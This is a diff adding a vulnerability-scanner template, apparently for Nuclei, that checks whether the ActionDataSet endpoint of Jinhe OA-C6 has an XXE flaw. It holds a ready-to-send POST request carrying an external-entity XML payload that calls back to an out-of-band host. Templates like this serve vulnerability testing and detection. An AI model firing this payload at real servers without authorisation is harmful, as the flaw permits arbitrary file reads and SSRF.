@@ -1,0 +1,31 @@
+id: jinhe-oa-c6-actiondataset-xxe
+info:
+  name: 金和OA-C6 ActionDataSet 接口存在XXE漏洞
+  author: qwtd
+  severity: high
+  description: |
+    金和OA-C6系统接口ActionDataSet存在XXE漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA-C6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ActionDataSet%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E.md
+  tags: 金和网络-金和OA
+  classification:
+    cwe-id: CWE-611
+http:
+  - raw:
+      - |
+        POST /jc6/servlet/ActionDataSet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/xml
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
